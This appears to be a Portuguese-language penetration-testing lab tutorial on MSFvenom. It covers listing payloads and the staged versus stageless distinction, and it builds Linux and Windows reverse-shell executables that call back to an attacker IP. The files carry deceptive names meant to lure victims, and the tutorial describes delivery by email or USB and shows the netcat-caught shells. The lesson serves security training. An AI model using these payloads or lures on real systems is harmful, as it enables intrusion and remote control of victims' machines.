Devemos estar cientes de que o uso de ataques automatizados no Metasploit exige que alcancemos uma máquina alvo vulnerável pela rede. Considere o que fizemos na última seção. Para `run the exploit module`, `deliver the payload`, e `establish the shell session`, precisávamos nos comunicar com o sistema em primeiro lugar. Isso pode ter sido possível com a presença na rede interna ou em uma rede que possui rotas para a rede onde o destino reside. Haverá situações em que não temos acesso direto à rede de uma máquina-alvo vulnerável. Nesses casos, precisaremos ser astutos na maneira como a carga útil é entregue e executada no sistema. Uma dessas maneiras pode ser usar `MSFvenom` criar uma carga útil e enviá-la por e-mail ou outros meios de engenharia social para conduzir esse usuário a executar o arquivo.

Além de fornecer uma carga útil com opções de entrega flexíveis, a MSFvenom também nos permite `encrypt` & `encode` cargas úteis para ignorar assinaturas comuns de detecção de antivírus. Vamos praticar um pouco com esses conceitos.

## Praticando com MSFvenom

No Pwnbox ou em qualquer host com o MSFvenom instalado, podemos emitir o comando `msfvenom -l payloads` para listar todas as cargas úteis disponíveis. Abaixo estão apenas algumas das cargas disponíveis. Algumas cargas úteis foram editadas para reduzir a saída e não se distrair da lição principal. Dê uma olhada nas cargas úteis e suas descrições:

#### Listar cargas úteis

```shell-session
casluxd@htb[/htb]$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                                Description
    ----                                                -----------
linux/x86/shell/reverse_nonx_tcp                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell/reverse_tcp_uuid                    Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_bind_ipv6_tcp                       Listen for a connection over IPv6 and spawn a command shell
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_bind_tcp_random_port                Listen for a connection in a random port and spawn a command shell. Use nmap to discover the open port: 'nmap -sS target -p-'.
linux/x86/shell_find_port                           Spawn a shell on an established connection
linux/x86/shell_find_tag                            Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6
linux/zarch/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
mainframe/shell_reverse_tcp                         Listen for a connection and spawn a  command shell. This implementation does not include ebcdic character translation, so a client wi
                                                        th translation capabilities is required. MSF handles this automatically.
multi/meterpreter/reverse_http                      Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTP
multi/meterpreter/reverse_https                     Handle Meterpreter sessions regardless of the target arch/platform. Tunnel communication over HTTPS
netware/shell/reverse_tcp                           Connect to the NetWare console (staged). Connect back to the attacker
nodejs/shell_bind_tcp                               Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp                            Creates an interactive shell via nodejs
nodejs/shell_reverse_tcp_ssl                        Creates an interactive shell via nodejs, uses SSL
osx/armle/execute/bind_tcp                          Spawn a command shell (staged). Listen for a connection
osx/armle/execute/reverse_tcp                       Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection
osx/armle/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to the attacker
osx/armle/shell_bind_tcp                            Listen for a connection and spawn a command shell
osx/armle/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
osx/armle/vibrate                                   Causes the iPhone to vibrate, only works when the AudioToolkit library has been loaded. Based on work by Charlie Miller
library has been loaded. Based on work by Charlie Miller

windows/dllinject/bind_hidden_tcp                   Inject a DLL via a reflective loader. Listen for a connection from a hidden port and spawn a command shell to the allowed host.
windows/dllinject/bind_ipv6_tcp                     Inject a DLL via a reflective loader. Listen for an IPv6 connection (Windows x86)
windows/dllinject/bind_ipv6_tcp_uuid                Inject a DLL via a reflective loader. Listen for an IPv6 connection with UUID Support (Windows x86)
windows/dllinject/bind_named_pipe                   Inject a DLL via a reflective loader. Listen for a pipe connection (Windows x86)
windows/dllinject/bind_nonx_tcp                     Inject a DLL via a reflective loader. Listen for a connection (No NX)
windows/dllinject/bind_tcp                          Inject a DLL via a reflective loader. Listen for a connection (Windows x86)
windows/dllinject/bind_tcp_rc4                      Inject a DLL via a reflective loader. Listen for a connection
windows/dllinject/bind_tcp_uuid                     Inject a DLL via a reflective loader. Listen for a connection with UUID Support (Windows x86)
windows/dllinject/find_tag                          Inject a DLL via a reflective loader. Use an established connection
windows/dllinject/reverse_hop_http                  Inject a DLL via a reflective loader. Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop
                                                        /hop.php to the PHP server you wish to use as a hop.
windows/dllinject/reverse_http                      Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows wininet)
windows/dllinject/reverse_http_proxy_pstore         Inject a DLL via a reflective loader. Tunnel communication over HTTP
windows/dllinject/reverse_ipv6_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker over IPv6
windows/dllinject/reverse_nonx_tcp                  Inject a DLL via a reflective loader. Connect back to the attacker (No NX)
windows/dllinject/reverse_ord_tcp                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_allports              Inject a DLL via a reflective loader. Try to connect back to the attacker, on all possible ports (1-65535, slowly)
windows/dllinject/reverse_tcp_dns                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4                   Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_rc4_dns               Inject a DLL via a reflective loader. Connect back to the attacker
windows/dllinject/reverse_tcp_uuid                  Inject a DLL via a reflective loader. Connect back to the attacker with UUID Support
windows/dllinject/reverse_winhttp                   Inject a DLL via a reflective loader. Tunnel communication over HTTP (Windows winhttp)
	
```

`What do you notice about the output?`

Podemos ver alguns detalhes que nos ajudarão a entender ainda mais as cargas úteis. Antes de tudo, podemos ver que a convenção de nomenclatura de carga útil quase sempre começa listando o sistema operacional do destino (`Linux`, `Windows`, `MacOS`, `mainframe`, etc ... ). Também podemos ver que algumas cargas úteis são descritas como (`staged`) ou (`stageless`). Vamos cobrir a diferença.

## Cargas úteis escalonadas vs. sem palco

`Staged` cargas úteis criam uma maneira de enviar mais componentes do nosso ataque. Podemos pensar nisso como se estivéssemos "montando o palco" para algo ainda mais útil. Tomemos, por exemplo, essa carga útil `linux/x86/shell/reverse_tcp`. Ao executar usando um módulo de exploração no Metasploit, essa carga útil enviará uma pequena `stage` que será executado no alvo e depois retornará à chamada `attack box` para baixar o restante da carga útil pela rede e executa o código do shell para estabelecer um shell reverso. Obviamente, se usarmos o Metasploit para executar essa carga útil, precisaremos configurar opções para apontar para os IPs e portas adequados, para que o ouvinte pegue o shell com sucesso. Lembre-se de que um estágio também ocupa espaço na memória, o que deixa menos espaço para a carga útil. O que acontece em cada estágio pode variar dependendo da carga útil.

`Stageless` cargas úteis não têm um estágio. Tomemos, por exemplo, essa carga útil `linux/zarch/meterpreter_reverse_tcp`. Usando um módulo de exploração no Metasploit, essa carga útil será enviada na íntegra através de uma conexão de rede sem um estágio. Isso pode nos beneficiar em ambientes onde não temos acesso a muita largura de banda e latência pode interferir. Cargas úteis escalonadas podem levar a sessões instáveis de shell nesses ambientes, portanto, seria melhor selecionar uma carga útil sem estágio. Além disso, às vezes as cargas úteis sem estágio podem ser melhores para fins de evasão devido ao menor tráfego que passa pela rede para executar a carga útil, especialmente se a entregarmos empregando engenharia social. Este conceito também é muito bem explicado pelo Rapid 7 nesta postagem de blog em [cargas úteis sem palco do Meterpreter](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

Agora que entendemos as diferenças entre uma carga útil faseada e sem estágio, podemos identificá-las no Metasploit. A resposta é simples. O `name` lhe dará seu primeiro marcador. Veja nossos exemplos de cima, `linux/x86/shell/reverse_tcp` é uma carga útil encenada, e podemos dizer pelo nome, pois cada / em seu nome representa um estágio do shell para a frente. Então `/shell/` é um estágio para enviar e `/reverse_tcp` é outro. Parece que tudo é pressionado juntos por uma carga útil sem palco. Veja o nosso exemplo `linux/zarch/meterpreter_reverse_tcp`. É semelhante à carga útil encenada, exceto que especifica a arquitetura que afeta, e possui a carga útil do shell e as comunicações de rede, todas dentro da mesma função `/meterpreter_reverse_tcp`. Para um último exemplo rápido desta convenção de nomenclatura, considere esses dois `windows/meterpreter/reverse_tcp` e `windows/meterpreter_reverse_tcp`. O primeiro é um `Staged` carga útil. Observe a convenção de nomenclatura que separa os estágios. O último é um `Stageless` carga útil, pois vemos a carga útil do shell e a comunicação em rede na mesma parte do nome. Se o nome da carga útil não parecer bem claro para você, ele geralmente detalha se a carga útil é encenada ou sem estágio na descrição.

## Construindo um payload stageless

#### Construa-o

```shell-session
casluxd@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

```shell-session
msfvenom
```

#### Criando uma carga útil

```shell-session
-p 
```

Este `option` indica que msfvenom está criando uma carga útil.

#### Escolhendo a carga útil com base na arquitetura

```shell-session
linux/x64/shell_reverse_tcp 
```

Especifica um `Linux` `64-bit` carga útil sem stage que iniciará um shell reverso baseado em TCP (`shell_reverse_tcp`).

#### Endereço para conectar novamente

```shell-session
LHOST=10.10.14.113 LPORT=443 
```

Quando executada, a carga útil retornará ao endereço IP especificado (`10.10.14.113`) na porta especificada (`443`).

#### Formato para gerar carga útil em

```shell-session
-f elf 
```

O sinalizador `-f` especifica o formato em que o binário gerado estará. Nesse caso, será um [.arquivo .elf](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format).

#### Saída

```shell-session
> createbackup.elf
```

Cria o binário .elf e nomeia o arquivo createbackup. Podemos nomear esse arquivo como quisermos. Idealmente, chamaríamos de algo discreto e / ou algo que alguém seria tentado a baixar e executar.

## Executando uma carga útil stageless

Neste ponto, temos a carga útil criada em nossa caixa de ataque. Agora precisaríamos desenvolver uma maneira de colocar essa carga útil no sistema de destino. Existem inúmeras maneiras de fazer isso. Aqui estão apenas algumas das maneiras comuns:

- Mensagem de email com o arquivo anexado.
- Faça o download do link em um site.
- Combinado com um módulo de exploração Metasploit (, isso provavelmente exigiria que já estivéssemos na rede interna ).
- Via pen drive como parte de um teste de penetração no local.

Quando o arquivo estiver nesse sistema, ele também precisará ser executado.

Imagine por um momento: a máquina de destino é uma caixa Ubuntu que um administrador de TI usa para gerenciar dispositivos de rede ( hospedando scripts de configuração, acessando roteadores e comutadores, etc. ). Poderíamos fazê-los clicar no arquivo em um e-mail que enviamos porque estavam usando esse sistema descuidadamente como se fosse um computador pessoal ou uma estação de trabalho.

#### Carga útil do Ubuntu

![[Pasted image 20230704204810.png]]

Teríamos um ouvinte pronto para pegar a conexão no lado da caixa de ataque após uma execução bem-sucedida.

#### Conexão NC

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 443
```

Quando o arquivo é executado, vemos que capturamos um shell.

#### Conexão estabelecida

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

Esse mesmo conceito pode ser usado para criar cargas úteis para várias plataformas, incluindo o Windows.

## Construindo uma carga útil stageless simples para um sistema Windows

Também podemos usar o msfvenom para criar um executável (Arquivo `.exe` ) que pode ser executado em um sistema Windows para fornecer um shell.

#### Carga útil do Windows

```shell-session
casluxd@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

A sintaxe do comando pode ser dividida da mesma maneira que fizemos acima. As únicas diferenças, é claro, são as `platform` (`Windows`) e formato (`.exe`) da carga útil.

## Executando uma carga útil simples e sem palco em um sistema Windows

Essa é outra situação em que precisamos ser criativos para que essa carga útil seja entregue a um sistema de destino. Sem nenhum `encoding` ou `encryption`, a carga útil neste formulário quase certamente seria detectada pelo Windows Defender AV.

![[Pasted image 20230704205059.png]]

Se o AV estivesse desativado, tudo o que o usuário precisaria fazer seria clicar duas vezes no arquivo a ser executado e teríamos uma sessão de shell.

```shell-session
casluxd@htb[/htb]$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DD25-26EB

 Directory of C:\Users\htb-student\Downloads

09/23/2021  10:26 AM    <DIR>          .
09/23/2021  10:26 AM    <DIR>          ..
09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
               2 Dir(s)   9,997,516,800 bytes free
```

